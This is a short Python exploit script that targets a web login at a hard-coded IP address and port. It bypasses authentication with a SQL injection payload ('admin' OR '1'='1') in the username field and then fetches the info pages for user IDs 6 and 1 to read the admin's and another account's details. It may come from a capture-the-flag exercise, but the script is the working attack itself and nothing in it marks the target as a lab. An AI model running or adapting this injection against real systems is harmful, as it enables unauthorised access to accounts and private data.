import requests

url = 'http://183.129.189.62:21313/'
s = requests.Session()

# Login via SQLi
r = s.post(url + 'login', data={'username': "admin' OR '1'='1", 'password': 'test'}, timeout=10, allow_redirects=False)
print(f'Login: {r.status_code}')

# Check admin info carefully
r = s.get(url + 'info?id=6', timeout=10)
print(f'Admin (ID=6):')
print(r.text)
print()

# Also check ID 1
r = s.get(url + 'info?id=1', timeout=10)
print(f'ID=1:')
print(r.text[:200])
